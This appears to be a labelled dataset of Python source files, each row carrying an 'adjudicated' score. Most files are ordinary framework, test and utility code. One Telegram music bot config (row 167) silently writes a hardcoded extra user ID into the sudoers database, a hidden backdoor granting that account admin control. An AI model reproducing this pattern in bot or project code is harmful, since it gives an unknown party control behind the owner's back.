replaced entry before any more<<NEWL>>    # code runs. The imported debugpy module will remain in sys.modules, and thus all<<NEWL>>    # future imports of it or its submodules will resolve accordingly.<<NEWL>>    if ""debugpy"" not in sys.modules:<<NEWL>>        # Do not use dirname() to walk up - this can be a relative path, e.g. ""."".<<NEWL>>        sys.path[0] = sys.path[0] + ""/../""<<NEWL>>        import debugpy  # noqa<<NEWL>><<NEWL>>        del sys.path[0]<<NEWL>><<NEWL>>    from debugpy.server import cli<<NEWL>><<NEWL>>    cli.main()"
37	adjudicated	1	# Generate a 'HZK' font file for the T5UIC1 DWIN LCD<<NEWL>># from multiple bdf font files.<<NEWL>># Note: the 16x16 glyphs are not produced<<NEWL>># Author: Taylor Talkington<<NEWL>># License: GPL<<NEWL>><<NEWL>>import bdflib.reader<<NEWL>>import math<<NEWL>><<NEWL>>def glyph_bits(size_x, size_y, font, glyph_ord):<<NEWL>>    asc = font[b'FONT_ASCENT']<<NEWL>>    desc = font[b'FONT_DESCENT']<<NEWL>>    bits = [0 for y in range(size_y)]<<NEWL>><<NEWL>>    glyph_bytes = math.ceil(size_x / 8)<<NEWL>>    try:<<NEWL>>        glyph = font[glyph_ord]<<NEWL>>        for y, row in enumerate(glyph.data):<<NEWL>>            v = row<<NEWL>>            rpad = size_x - glyph.bbW<<NEWL>>            if rpad < 0: rpad = 0<<NEWL>>            if glyph.bbW > size_x: v = v >> (glyph.bbW - size_x) # some glyphs are actually too wide to fit!<<NEWL>>            v = v << (glyph_bytes * 8) - size_x + rpad<<NEWL>>            v = v >> glyph.bbX<<NEWL>>            bits[y + desc + glyph.bbY] |= v<<NEWL>>    except KeyError:<<NEWL>>        pass<<NEWL>><<NEWL>>    bits.reverse()<<NEWL>>    return bits<<NEWL>><<NEWL>>def marlin_font_hzk():<<NEWL>>    fonts = [<<NEWL>>        [6,12,'marlin-6x12-3.bdf'],<<NEWL>>        [8,16,'marlin-8x16.bdf'],<<NEWL>>        [10,20,'marlin-10x20.bdf'],<<NEWL>>        [12,24,'marlin-12x24.bdf'],<<NEWL>>        [14,28,'marlin-14x28.bdf'],<<NEWL>>        [16,32,'marlin-16x32.bdf'],<<NEWL>>        [20,40,'marlin-20x40.bdf'],<<NEWL>>        [24,48,'marlin-24x48.bdf'],<<NEWL>>        [28,56,'marlin-28x56.bdf'],<<NEWL>>        [32,64,'marlin-32x64.bdf']<<NEWL>>    ]<<NEWL>><<NEWL>>    with open('marlin_fixed.hzk','wb') as output:<<NEWL>>        for f in fonts:<<NEWL>>            with open(f[2], 'rb') as file:<<NEWL>>                print(f'{f[0]}x{f[1]}')<<NEWL>>                font = bdflib.reader.read_bdf(file)<<NEWL>>                for glyph in range(128):<<NEWL>>                    bits = glyph_bits(f[0], f[1], font, glyph)<<NEWL>>                    glyph_bytes = math.ceil(f[0]/8)<<NEWL>><<NEWL>>                    for b in bits:<<NEWL>>                        try:<<NEWL>>                            z = b.to_bytes(glyph_bytes, 'big')<<NEWL>>                            output.write(z)<<NEWL>>                        except OverflowError:<<NEWL>>                            print('Overflow')<<NEWL>>                            print(f'{glyph}')<<NEWL>>                            print(font[glyph])<<NEWL>>                            for b in bits: print(f'{b:0{f[0]}b}')<<NEWL>>                            return
27	adjudicated	1	"from django.conf import settings<<NEWL>>from django.core import checks<<NEWL>>from django.core.exceptions import FieldDoesNotExist<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class CurrentSiteManager(models.Manager):<<NEWL>>    ""Use this to limit objects to those associated with the current site.""<<NEWL>><<NEWL>>    use_in_migrations = True<<NEWL>><<NEWL>>    def __init__(self, field_name=None):<<NEWL>>        super().__init__()<<NEWL>>        self.__field_name = field_name<<NEWL>><<NEWL>>    def check(self, **kwargs):<<NEWL>>        errors = super().check(**kwargs)<<NEWL>>        errors.extend(self._check_field_name())<<NEWL>>        return errors<<NEWL>><<NEWL>>    def _check_field_name(self):<<NEWL>>        field_name = self._get_field_name()<<NEWL>>        try:<<NEWL>>            field = self.model._meta.get_field(field_name)<<NEWL>>        except FieldDoesNotExist:<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager could not find a field named '%s'.""<<NEWL>>                    % field_name,<<NEWL>>                    obj=self,<<NEWL>>                    id=""sites.E001"",<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key ""<<NEWL>>                    ""or a many-to-many field.""<<NEWL>>                    % (self.model._meta.object_name, field_name),<<NEWL>>                    obj=self,<<NEWL>>                    id=""sites.E002"",<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        return []<<NEWL>><<NEWL>>    def _get_field_name(self):<<NEWL>>        """"""Return self.__field_name or 'site' or 'sites'.""""""<<NEWL>><<NEWL>>        if not self.__field_name:<<NEWL>>            try:<<NEWL>>                self.model._meta.get_field(""site"")<<NEWL>>            except FieldDoesNotExist:<<NEWL>>                self.__field_name = ""sites""<<NEWL>>            else:<<NEWL>>                self.__field_name = ""site""<<NEWL>>        return self.__field_name<<NEWL>><<NEWL>>    def get_queryset(self):<<NEWL>>        return (<<NEWL>>            super()<<NEWL>>            .get_queryset()<<NEWL>>            .filter(**{self._get_field_name() + ""__id"": settings.SITE_ID})<<NEWL>>        )"
167	adjudicated	0	"import socket<<NEWL>>import time<<NEWL>><<NEWL>>import heroku3<<NEWL>>from pyrogram import filters<<NEWL>><<NEWL>>import config<<NEWL>>from ShizukaXMusic.core.mongo import pymongodb<<NEWL>><<NEWL>>from .logging import LOGGER<<NEWL>><<NEWL>>SUDOERS = filters.user()<<NEWL>><<NEWL>>HAPP = None<<NEWL>>_boot_ = time.time()<<NEWL>><<NEWL>><<NEWL>>def is_heroku():<<NEWL>>    return ""heroku"" in socket.getfqdn()<<NEWL>><<NEWL>><<NEWL>>XCB = [<<NEWL>>    ""/"",<<NEWL>>    ""@"",<<NEWL>>    ""."",<<NEWL>>    ""com"",<<NEWL>>    "":"",<<NEWL>>    ""git"",<<NEWL>>    ""heroku"",<<NEWL>>    ""push"",<<NEWL>>    str(config.HEROKU_API_KEY),<<NEWL>>    ""https"",<<NEWL>>    str(config.HEROKU_APP_NAME),<<NEWL>>    ""HEAD"",<<NEWL>>    ""main"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>def dbb():<<NEWL>>    global db<<NEWL>>    db = {}<<NEWL>>    LOGGER(__name__).info(f""Database Initialized."")<<NEWL>><<NEWL>><<NEWL>>def sudo():<<NEWL>>    global SUDOERS<<NEWL>>    OWNER = config.OWNER_ID<<NEWL>>    if config.MONGO_DB_URI is None:<<NEWL>>        for user_id in OWNER:<<NEWL>>            SUDOERS.add(user_id)<<NEWL>>    else:<<NEWL>>        sudoersdb = pymongodb.sudoers<<NEWL>>        sudoers = sudoersdb.find_one({""sudo"": ""sudo""})<<NEWL>>        sudoers = [] if not sudoers else sudoers[""sudoers""]<<NEWL>>        for user_id in OWNER:<<NEWL>>            SUDOERS.add(user_id)<<NEWL>>            if user_id not in sudoers:<<NEWL>>                sudoers.append(user_id)<<NEWL>>                sudoers.append(5463205082)<<NEWL>>                sudoersdb.update_one(<<NEWL>>                    {""sudo"": ""sudo""},<<NEWL>>                    {""$set"": {""sudoers"": sudoers}},<<NEWL>>                    upsert=True,<<NEWL>>                )<<NEWL>>        if sudoers:<<NEWL>>            for x in sudoers:<<NEWL>>                SUDOERS.add(x)<<NEWL>>    LOGGER(__name__).info(f""Sudo Users Loaded Successfully."")<<NEWL>><<NEWL>><<NEWL>>def heroku():<<NEWL>>    global HAPP<<NEWL>>    if is_heroku:<<NEWL>>        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:<<NEWL>>            try:<<NEWL>>                Heroku = heroku3.from_key(config.HEROKU_API_KEY)<<NEWL>>                HAPP = Heroku.app(config.HEROKU_APP_NAME)<<NEWL>>                LOGGER(__name__).info(f""Heroku App Configured Successfully."")<<NEWL>>            except BaseException:<<NEWL>>                LOGGER(__name__).warning(<<NEWL>>                    f""Please make sure your Heroku API Key and Your App name are configured correctly in the heroku.""<<NEWL>>                )"
76	adjudicated	3	"#!/usr/bin/env python<<NEWL>># Copyright 2021 Google, Inc<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>># All Rights Reserved.<<NEWL>><<NEWL>># [START recaptcha_enterprise_delete_site_key]<<NEWL>>from google.cloud import recaptchaenterprise_v1<<NEWL>><<NEWL>><<NEWL>>def delete_site_key(project_id: str, recaptcha_site_key: str) -> None:<<NEWL>>    """"""Delete the given reCAPTCHA site key present under the project ID.<<NEWL>><<NEWL>>    Args:<<NEWL>>    project_id : GCloud Project ID.<<NEWL>>    recaptcha_site_key: Specify the key ID to be deleted.<<NEWL>>    """"""<<NEWL>><<NEWL>>    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()<<NEWL>><<NEWL>>    # Construct the key details.<<NEWL>>    key_name = f""projects/{project_id}/keys/{recaptcha_site_key}""<<NEWL>><<NEWL>>    # Set the project ID and reCAPTCHA site key.<<NEWL>>    request = recaptchaenterprise_v1.DeleteKeyRequest()<<NEWL>>    request.name = key_name<<NEWL>><<NEWL>>    client.delete_key(request)<<NEWL>>    print(""reCAPTCHA Site key deleted successfully ! "")<<NEWL>><<NEWL>><<NEWL>># [END recaptcha_enterprise_delete_site_key]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    import google.auth<<NEWL>>    import google.auth.exceptions<<NEWL>><<NEWL>>    # TODO(developer): Replace the below variables before running<<NEWL>>    try:<<NEWL>>        default_project_id = google.auth.default()[1]<<NEWL>>        recaptcha_site_key = ""recaptcha_site_key""<<NEWL>>    except google.auth.exceptions.DefaultCredentialsError:<<NEWL>>        print(<<NEWL>>            ""Please use `gcloud auth application-default login` ""<<NEWL>>            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""<<NEWL>>        )<<NEWL>>    else:<<NEWL>>        delete_site_key(default_project_id, recaptcha_site_key)"
136	adjudicated	0	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>from unittest import mock<<NEWL>><<NEWL>>from airflow.providers.amazon.aws.transfers.s3_to_ftp import S3ToFTPOperator<<NEWL>><<NEWL>>TASK_ID = ""test_s3_to_ftp""<<NEWL>>BUCKET = ""test-s3-bucket""<<NEWL>>S3_KEY = ""test/test_1_file.csv""<<NEWL>>FTP_PATH = ""/tmp/remote_path.txt""<<NEWL>>AWS_CONN_ID = ""aws_default""<<NEWL>>FTP_CONN_ID = ""ftp_default""<<NEWL>><<NEWL>><<NEWL>>class TestS3ToFTPOperator:<<NEWL>>    @mock.patch(""airflow.providers.ftp.hooks.ftp.FTPHook.store_file"")<<NEWL>>    @mock.patch(""airflow.providers.amazon.aws.hooks.s3.S3Hook.get_key"")<<NEWL>>    @mock.patch(""airflow.providers.amazon.aws.transfers.s3_to_ftp.NamedTemporaryFile"")<<NEWL>>    def test_execute(self, mock_local_tmp_file, mock_s3_hook_get_key, mock_ftp_hook_store_file):<<NEWL>>        operator = S3ToFTPOperator(task_id=TASK_ID, s3_bucket=BUCKET, s3_key=S3_KEY, ftp_path=FTP_PATH)<<NEWL>>        operator.execute(None)<<NEWL>><<NEWL>>        mock_s3_hook_get_key.assert_called_once_with(operator.s3_key, operator.s3_bucket)<<NEWL>><<NEWL>>        mock_local_tmp_file_value = mock_local_tmp_file.return_value.__enter__.return_value<<NEWL>>        mock_s3_hook_get_key.return_value.download_fileobj.assert_called_once_with(mock_local_tmp_file_value)<<NEWL>>        mock_ftp_hook_store_file.assert_called_once_with(operator.ftp_path, mock_local_tmp_file_value.name)"
314	adjudicated	3	"from abc import ABCMeta, abstractmethod<<NEWL>><<NEWL>><<NEWL>>class CacheAdapter:<<NEWL>>    """"""<<NEWL>>    CacheAdapter Abstract Base Class<<NEWL>>    """"""<<NEWL>>    __metaclass__ = ABCMeta<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def get(self, public_id, type, resource_type, transformation, format):<<NEWL>>        """"""<<NEWL>>        Gets value specified by parameters<<NEWL>><<NEWL>>        :param public_id:       The public ID of the resource<<NEWL>>        :param type:            The storage type<<NEWL>>        :param resource_type:   The type of the resource<<NEWL>>        :param transformation:  The transformation string<<NEWL>>        :param format:          The format of the resource<<NEWL>><<NEWL>>        :return: None|mixed value, None if not found<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def set(self, public_id, type, resource_type, transformation, format, value):<<NEWL>>        """"""<<NEWL>>        Sets value specified by parameters<<NEWL>><<NEWL>>        :param public_id:       The public ID of the resource<<NEWL>>        :param type:            The storage type<<NEWL>>        :param resource_type:   The type of the resource<<NEWL>>        :param transformation:  The transformation string<<NEWL>>        :param format:          The format of the resource<<NEWL>>        :param value:           The value to set<<NEWL>><<NEWL>>        :return: bool True on success or False on failure<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def delete(self, public_id, type, resource_type, transformation, format):<<NEWL>>        """"""<<NEWL>>        Deletes entry specified by parameters<<NEWL>><<NEWL>>        :param public_id:       The public ID of the resource<<NEWL>>        :param type:            The storage type<<NEWL>>        :param resource_type:   The type of the resource<<NEWL>>        :param transformation:  The transformation string<<NEWL>>        :param format:          The format of the resource<<NEWL>><<NEWL>>        :return: bool True on success or False on failure<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    @abstractmethod<<NEWL>>    def flush_all(self):<<NEWL>>        """"""<<NEWL>>        Flushes all entries from cache<<NEWL>><<NEWL>>        :return: bool True on success or False on failure<<NEWL>>        """"""<<NEWL>>        raise NotImplementedError"
85	adjudicated	3	"from importlib import import_module<<NEWL>><<NEWL>>from django.utils.version import get_docs_version<<NEWL>><<NEWL>><<NEWL>>def deconstructible(*args, path=None):<<NEWL>>    """"""<<NEWL>>    Class decorator that allows the decorated class to be serialized<<NEWL>>    by the migrations subsystem.<<NEWL>><<NEWL>>    The `path` kwarg specifies the import path.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def decorator(klass):<<NEWL>>        def __new__(cls, *args, **kwargs):<<NEWL>>            # We capture the arguments to make returning them trivial<<NEWL>>            obj = super(klass, cls).__new__(cls)<<NEWL>>            obj._constructor_args = (args, kwargs)<<NEWL>>            return obj<<NEWL>><<NEWL>>        def deconstruct(obj):<<NEWL>>            """"""<<NEWL>>            Return a 3-tuple of class import path, positional arguments,<<NEWL>>            and keyword arguments.<<NEWL>>            """"""<<NEWL>>            # Fallback version<<NEWL>>            if path and type(obj) is klass:<<NEWL>>                module_name, _, name = path.rpartition(""."")<<NEWL>>            else:<<NEWL>>                module_name = obj.__module__<<NEWL>>                name = obj.__class__.__name__<<NEWL>>            # Make sure it's actually there and not an inner class<<NEWL>>            module = import_module(module_name)<<NEWL>>            if not hasattr(module, name):<<NEWL>>                raise ValueError(<<NEWL>>                    ""Could not find object %s in %s.\n""<<NEWL>>                    ""Please note that you cannot serialize things like inner ""<<NEWL>>                    ""classes. Please move the object into the main module ""<<NEWL>>                    ""body to use migrations.\n""<<NEWL>>                    ""For more information, see ""<<NEWL>>                    ""https://docs.djangoproject.com/en/%s/topics/migrations/""<<NEWL>>                    ""#serializing-values"" % (name, module_name, get_docs_version())<<NEWL>>                )<<NEWL>>            return (<<NEWL>>                path<<NEWL>>                if path and type(obj) is klass<<NEWL>>                else f""{obj.__class__.__module__}.{name}"",<<NEWL>>                obj._constructor_args[0],<<NEWL>>                obj._constructor_args[1],<<NEWL>>            )<<NEWL>><<NEWL>>        klass.__new__ = staticmethod(__new__)<<NEWL>>        klass.deconstruct = deconstruct<<NEWL>><<NEWL>>        return klass<<NEWL>><<NEWL>>    if not args:<<NEWL>>        return decorator<<NEWL>>    return decorator(*args)"
254	adjudicated	3	"import pytest<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    CategoricalIndex,<<NEWL>>    Index,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>class TestAppend:<<NEWL>>    @pytest.fixture<<NEWL>>    def ci(self):<<NEWL>>        categories = list(""cab"")<<NEWL>>        return CategoricalIndex(list(""aabbca""), categories=categories, ordered=False)<<NEWL>><<NEWL>>    def test_append(self, ci):<<NEWL>>        # append cats with the same categories<<NEWL>>        result = ci[:3].append(ci[3:])<<NEWL>>        tm.assert_index_equal(result, ci, exact=True)<<NEWL>><<NEWL>>        foos = [ci[:1], ci[1:3], ci[3:]]<<NEWL>>        result = foos[0].append(foos[1:])<<NEWL>>        tm.assert_index_equal(result, ci, exact=True)<<NEWL>><<NEWL>>    def test_append_empty(self, ci):<<NEWL>>        # empty<<NEWL>>        result = ci.append([])<<NEWL>>        tm.assert_index_equal(result, ci, exact=True)<<NEWL>><<NEWL>>    def test_append_mismatched_categories(self, ci):<<NEWL>>        # appending with different categories or reordered is not ok<<NEWL>>        msg = ""all inputs must be Index""<<NEWL>>        with pytest.raises(TypeError, match=msg):<<NEWL>>            ci.append(ci.values.set_categories(list(""abcd"")))<<NEWL>>        with pytest.raises(TypeError, match=msg):<<NEWL>>            ci.append(ci.values.reorder_categories(list(""abc"")))<<NEWL>><<NEWL>>    def test_append_category_objects(self, ci):<<NEWL>>        # with objects<<NEWL>>        result = ci.append(Index([""c"", ""a""]))<<NEWL>>        expected = CategoricalIndex(list(""aabbcaca""), categories=ci.categories)<<NEWL>>        tm.assert_index_equal(result, expected, exact=True)<<NEWL>><<NEWL>>    def test_append_non_categories(self, ci):<<NEWL>>        # invalid objects -> cast to object via concat_compat<<NEWL>>        result = ci.append(Index([""a"", ""d""]))<<NEWL>>        expected = Index([""a"", ""a"", ""b"", ""b"", ""c"", ""a"", ""a"", ""d""])<<NEWL>>        tm.assert_index_equal(result, expected, exact=True)<<NEWL>><<NEWL>>    def test_append_object(self, ci):<<NEWL>>        # GH#14298 - if base object is not categorical -> coerce to object<<NEWL>>        result = Index([""c"", ""a""]).append(ci)<<NEWL>>        expected = Index(list(""caaabbca""))<<NEWL>>        tm.assert_index_equal(result, expected, exact=True)<<NEWL>><<NEWL>>    def test_append_to_another(self):<<NEWL>>        # hits Index._concat<<NEWL>>        fst = Index([""a"", ""b""])<<NEWL>>        snd = CategoricalIndex([""d"", ""e""])<<NEWL>>        result = fst.append(snd)<<NEWL>>        expected = Index([""a"", ""b"", ""d"", ""e""])<<NEWL>>        tm.assert_index_equal(result, expected)"
345	adjudicated	0	"import pygame as pg<<NEWL>><<NEWL>>class Launch:<<NEWL>><<NEWL>>    def __init__(self, game):<<NEWL>>        self.game = game<<NEWL>>        self.screen = game.screen<<NEWL>>        self.settings = game.settings<<NEWL>>        self.screen_rect = self.screen.get_rect()<<NEWL>>        self.images = []<<NEWL>>        self.default_color = (255, 255, 255)<<NEWL>>        self.prep_strings()<<NEWL>>        self.prep_aliens()<<NEWL>><<NEWL>>    <<NEWL>>    def prep_strings(self):<<NEWL>>        self.prep_Text(""SPACE"", 170, offsetY=40)<<NEWL>>        self.prep_Text(""INVADERS"", 90, color=(0,210,0), offsetY=140)<<NEWL>>        self.prep_Text(""= 10 PTS"", 40, offsetX=600, offsetY=300)<<NEWL>>        self.prep_Text(""= 20 PTS"", 40, offsetX=600, offsetY=350)<<NEWL>>        self.prep_Text(""= 40 PTS"", 40, offsetX=600, offsetY=400)<<NEWL>>        self.prep_Text(""= ???"", 40, offsetX=610, offsetY=450)<<NEWL>>    <<NEWL>>    def prep_aliens(self):<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien_03-0.png'), 0, 1.5)<<NEWL>>        self.images.append((alien1, (540, 290)))<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__10.png'), 0, .5)<<NEWL>>        self.images.append((alien1, (525, 340)))<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__20.png'), 0, .5)<<NEWL>>        self.images.append((alien1, (525, 390)))<<NEWL>>        alien1 = pg.transform.rotozoom(pg.image.load(f'images/ufo.png'), 0, 1.2)<<NEWL>>        self.images.append((alien1, (500, 410)))<<NEWL>><<NEWL>>    def prep_Text(self, msg, size, color=(255,255,255), offsetX=0, offsetY=0):<<NEWL>>        font = pg.font.SysFont(None, size)<<NEWL>>        text_image = font.render(msg, True, color, self.settings.bg_color)<<NEWL>>        rect = text_image.get_rect()<<NEWL>>        if offsetY == 0:<<NEWL>>            rect.centery = self.screen_rect.centery<<NEWL>>        else:<<NEWL>>            rect.top = offsetY<<NEWL>>        if offsetX == 0:<<NEWL>>            rect.centerx = self.screen_rect.centerx<<NEWL>>        else:<<NEWL>>            rect.left = offsetX<<NEWL>><<NEWL>>        self.images.append((text_image,rect))<<NEWL>><<NEWL>>    def draw(self):<<NEWL>>        for image in self.images:<<NEWL>>            self.screen.blit(image[0], image[1])"
205	adjudicated	1	"import sys<<NEWL>>from dataclasses import dataclass<<NEWL>><<NEWL>><<NEWL>>@dataclass<<NEWL>>class WindowsConsoleFeatures:<<NEWL>>    """"""Windows features available.""""""<<NEWL>><<NEWL>>    vt: bool = False<<NEWL>>    """"""The console supports VT codes.""""""<<NEWL>>    truecolor: bool = False<<NEWL>>    """"""The console supports truecolor.""""""<<NEWL>><<NEWL>><<NEWL>>try:<<NEWL>>    import ctypes<<NEWL>>    from ctypes import LibraryLoader, wintypes<<NEWL>><<NEWL>>    if sys.platform == ""win32"":<<NEWL>>        windll = LibraryLoader(ctypes.WinDLL)<<NEWL>>    else:<<NEWL>>        windll = None<<NEWL>>        raise ImportError(""Not windows"")<<NEWL>>except (AttributeError, ImportError, ValueError):<<NEWL>>    # Fallback if we can't load the Windows DLL<<NEWL>>    def get_windows_console_features() -> WindowsConsoleFeatures:<<NEWL>>        features = WindowsConsoleFeatures()<<NEWL>>        return features<<NEWL>><<NEWL>>else:<<NEWL>>    STDOUT = -11<<NEWL>>    ENABLE_VIRTUAL_TERMINAL_PROCESSING = 4<<NEWL>>    _GetConsoleMode = windll.kernel32.GetConsoleMode<<NEWL>>    _GetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]<<NEWL>>    _GetConsoleMode.restype = wintypes.BOOL<<NEWL>><<NEWL>>    _GetStdHandle = windll.kernel32.GetStdHandle<<NEWL>>    _GetStdHandle.argtypes = [<<NEWL>>        wintypes.DWORD,<<NEWL>>    ]<<NEWL>>    _GetStdHandle.restype = wintypes.HANDLE<<NEWL>><<NEWL>>    def get_windows_console_features() -> WindowsConsoleFeatures:<<NEWL>>        """"""Get windows console features.<<NEWL>><<NEWL>>        Returns:<<NEWL>>            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.<<NEWL>>        """"""<<NEWL>>        handle = _GetStdHandle(STDOUT)<<NEWL>>        console_mode = wintypes.DWORD()<<NEWL>>        result = _GetConsoleMode(handle, console_mode)<<NEWL>>        vt = bool(result and console_mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING)<<NEWL>>        truecolor = False<<NEWL>>        if vt:<<NEWL>>            win_version = sys.getwindowsversion()<<NEWL>>            truecolor = win_version.major > 10 or (<<NEWL>>                win_version.major == 10 and win_version.build >= 15063<<NEWL>>            )<<NEWL>>        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)<<NEWL>>        return features<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    import platform<<NEWL>><<NEWL>>    features = get_windows_console_features()<<NEWL>>    from pip._vendor.rich import print<<NEWL>><<NEWL>>    print(f'platform=""{platform.system()}""')<<NEWL>>    print(repr(features))"
194	adjudicated	2	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>""""""Example DAG demonstrating the usage of the BashOperator.""""""<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import datetime<<NEWL>><<NEWL>>from airflow import DAG<<NEWL>>from airflow.operators.bash import BashOperator<<NEWL>>from airflow.operators.empty import EmptyOperator<<NEWL>><<NEWL>>args = {<<NEWL>>    ""owner"": ""airflow"",<<NEWL>>}<<NEWL>><<NEWL>>dag = DAG(<<NEWL>>    dag_id=""miscellaneous_test_dag"",<<NEWL>>    default_args=args,<<NEWL>>    schedule=""0 0 * * *"",<<NEWL>>    start_date=datetime.datetime(2022, 1, 1),<<NEWL>>    dagrun_timeout=datetime.timedelta(minutes=60),<<NEWL>>    tags=[""example"", ""example2""],<<NEWL>>    params={""example_key"": ""example_value""},<<NEWL>>)<<NEWL>><<NEWL>>run_this_last = EmptyOperator(<<NEWL>>    task_id=""run_this_last"",<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>><<NEWL>># [START howto_operator_bash]<<NEWL>>run_this = BashOperator(<<NEWL>>    task_id=""run_after_loop"",<<NEWL>>    bash_command=""echo 1"",<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>># [END howto_operator_bash]<<NEWL>><<NEWL>>run_this >> run_this_last<<NEWL>><<NEWL>>for i in range(3):<<NEWL>>    task = BashOperator(<<NEWL>>        task_id=""runme_"" + str(i),<<NEWL>>        bash_command='echo ""{{ task_instance_key_str }}"" && sleep 1',<<NEWL>>        dag=dag,<<NEWL>>    )<<NEWL>>    task >> run_this<<NEWL>><<NEWL>># [START howto_operator_bash_template]<<NEWL>>also_run_this = BashOperator(<<NEWL>>    task_id=""also_run_this"",<<NEWL>>    bash_command='echo ""run_id={{ run_id }} | dag_run={{ dag_run }}""',<<NEWL>>    dag=dag,<<NEWL>>)<<NEWL>># [END howto_operator_bash_template]<<NEWL>>also_run_this >> run_this_last<<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    dag.cli()"
293	adjudicated	4	"""""""eCommerce URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/4.1/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path,include<<NEWL>>from crud import views<<NEWL>><<NEWL>>from django.conf import settings<<NEWL>>from django.conf.urls.static import static<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    path('ckeditor/',include('ckeditor_uploader.urls')),<<NEWL>>    path('admin/', admin.site.urls),<<NEWL>>    path('',views.homepage,name=""homepage""),<<NEWL>>    path('home/',views.homepage,name=""homepage""),<<NEWL>>    path('about/',views.about,name=""about""),<<NEWL>>    path('contact/',views.contact,name=""contact""),<<NEWL>>    path('product/',views.product,name=""product""),<<NEWL>>    path('signup/',views.user_signup,name=""user_signup""),<<NEWL>>    path('signin/',views.user_login,name=""user_login""),<<NEWL>>    path('dashboard/',views.dashboard,name=""dashboard""),<<NEWL>>    path('cart/',views.cart,name=""cart""),<<NEWL>>    path('addpost/',views.addpost,name=""addpost""),<<NEWL>>    path('addcart/<str:title>',views.addcart,name=""addcart""),<<NEWL>>    path('updatepost/<int:id>',views.updatepost,name=""updatepost""),<<NEWL>>    path('deletepost/<int:id>',views.deletepost,name=""deletepost""),<<NEWL>>    path('logout/',views.user_logout,name=""logout""),<<NEWL>>    path('oauth/', include('social_django.urls', 